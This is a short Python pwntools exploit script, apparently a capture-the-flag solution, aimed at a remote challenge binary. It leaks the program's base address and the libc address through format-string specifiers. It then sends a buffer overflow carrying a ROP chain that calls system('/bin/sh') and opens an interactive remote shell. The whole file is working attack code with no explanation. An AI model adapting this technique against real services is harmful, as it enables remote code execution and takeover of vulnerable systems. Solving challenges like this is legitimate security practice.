#!/usr/bin/python3
from time import time
from ctypes import CDLL
from pwn import *
context.binary = exe = ELF('./chal_patched',checksec=False)
libc =  ELF('./libc6_2.35-0ubuntu3.8_amd64.so')
p = process()
p = remote('23.146.248.230', 12355)
#gdb.attach(p,gdbscript='''
#           b*bof+61
#           ''')
p.sendlineafter(b'fsb> ',b'%9$p')
exe.address = int(p.recv(14),16) - 0x12d9
print(hex(exe.address))
p.sendlineafter(b'fsb> ',b'%7$saaaa' + p64(exe.got.puts))
leak_puts = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak_puts - libc.sym.puts
print("libc: ",hex(libc.address))
pop_rdi = 0x000000000002a3e5 + libc.address
bin_sh = next(libc.search('/bin/sh\x00'))
input()
p.sendline(b'a'*16 + p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rdi+1) +p64(libc.sym.system))
p.interactive()
